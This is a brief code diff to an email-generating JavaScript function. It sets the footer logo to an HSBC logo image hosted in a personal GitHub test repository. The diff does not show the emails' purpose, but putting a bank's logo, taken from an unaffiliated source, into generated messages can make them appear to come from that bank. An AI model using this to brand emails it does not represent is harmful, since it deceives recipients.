@@ -450,7 +450,7 @@ function generateEmailContent() {
             <!-- Internal Footer -->
             <tr>
                 <p style="text-align: center;">
-                <img src="" alt="Logo" width="150">
+                <img src="https://raw.githubusercontent.com/kalo143225/my-test-site/refs/heads/master/hsbclogo.jpg" alt="Logo" width="150">
                 </p>
                 <td bgcolor="#333" style="padding:10px 16px;color:white;text-align:center;font-weight:bold;border-top:1px solid #555;font-family:Arial,sans-serif;">
                     ${document.querySelector('.internal-footer').textContent}
